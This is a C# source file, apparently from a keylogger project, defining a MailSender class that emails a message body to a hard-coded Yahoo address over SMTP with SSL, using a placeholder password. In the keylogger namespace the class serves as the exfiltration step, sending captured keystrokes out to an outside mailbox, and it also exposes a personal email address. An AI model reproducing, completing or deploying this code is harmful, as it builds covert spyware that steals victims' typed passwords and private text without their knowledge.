using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    public class MailSender
    {
        string _smtpClient, _mailFrom;
        int _smtpPort;
        public MailSender(string client,int port,string mail)
        {
            _smtpClient = client;
            _smtpPort = port;
            _mailFrom = mail;
        }

        public void SendMail(string message)
        {
            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(_mailFrom);
                mail.To.Add(new MailAddress("mihaluca.sergiu@yahoo.com"));
                mail.Body = message;

                SmtpClient Smtp_Client = new SmtpClient(_smtpClient, _smtpPort);
                Smtp_Client.EnableSsl = true;
                Smtp_Client.Credentials = new NetworkCredential(_mailFrom, "YOUR-EMAIL-PASSWORD"); ;

                Smtp_Client.SendCompleted += new SendCompletedEventHandler(smtp_SendCompleted);
                Smtp_Client.SendAsync(mail, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void smtp_SendCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            if (e.Error != null) { }
            else if (e.Cancelled) { }
            else
            { }
        }
       
    }
}
